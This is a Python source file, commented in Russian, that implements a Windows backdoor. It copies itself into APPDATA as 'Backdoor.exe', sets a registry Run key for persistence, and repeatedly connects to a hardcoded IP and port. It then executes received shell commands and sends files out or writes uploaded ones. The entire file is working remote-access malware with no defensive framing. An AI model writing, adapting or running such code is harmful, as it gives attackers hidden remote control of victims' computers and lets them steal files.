#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import winreg
import base64 

#конвектирует данные пайтона в джейсон а его в свою очередь в байты
def reliable_send(data):
        json_data = json.dumps(data).encode()
        sock.send(json_data)

#отправляет большие данные по частям
def reliable_recv():
        json_data = b""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

#повторное подключение
def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("192.168.178.67", 54321))
                        shell()
                except:
                        connection()

#получает файлы, команды, выполняет и потом отправляет результаты на сервер
def shell():
        while True:
                command = reliable_recv()
                if command == "q":
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        try:
                                os.chdir(command[:3].strip())
                        except:
                                pass
                elif command[:8] == "download":
                        try:
                                with open(command[9:], "rb") as file:
                                        reliable_send(base64.b64encode(file.read()).decode())
                        except FileNotFoundError:
                                reliable_send("[!!] Файл не найден") 
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as file:
                                data = reliable_recv()
                                try:
                                        file.write(base64.b64decode(data))
                                except:
                                        pass
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result.decode())
                        except:
                                reliable_send("[!!] Cant Execute That Command")

#создание автозапуска в реестре
location = os.environ["APPDATA"] + "\\Backdoor.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
        except Exception as e:
                pass

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
